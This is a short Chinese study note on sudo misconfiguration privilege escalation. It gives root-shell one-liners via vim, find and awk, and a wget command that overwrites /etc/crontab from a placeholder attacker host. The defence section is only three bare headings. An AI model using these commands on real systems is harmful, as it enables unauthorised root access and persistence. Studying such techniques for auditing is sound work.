# Sudo配置错误提权笔记

## 简介
Sudo配置错误允许普通用户以root权限执行命令。

## 检查
```bash
sudo -l
```

## 可利用命令

### 1. vim/less
```bash
sudo vim
:!sh
```

### 2. find
```bash
sudo find . -exec /bin/sh \;
```

### 3. awk
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```

### 4. wget
```bash
sudo wget -O /etc/crontab http://attacker.com
```

## 防御

### 1. 最小权限
### 2. 定期审计
### 3. 限制命令

---
*学习时间: 2026-02-20*
*目标: 成为世界第一黑客*
